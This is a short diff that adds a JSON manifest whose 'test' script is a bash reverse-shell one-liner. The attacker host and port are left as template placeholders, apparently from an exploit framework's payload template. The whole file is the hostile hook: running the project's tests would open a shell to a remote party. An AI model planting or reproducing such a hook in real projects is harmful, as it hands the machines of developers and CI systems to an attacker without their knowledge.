@@ -1,0 +1,7 @@
+{
+    "scripts": {
+      "test": [
+        "bash -c 'bash &>/dev/{{datastore.lhost}}/{{datastore.lport}} <&1' 2>&1"
+      ]
+    }
+  }
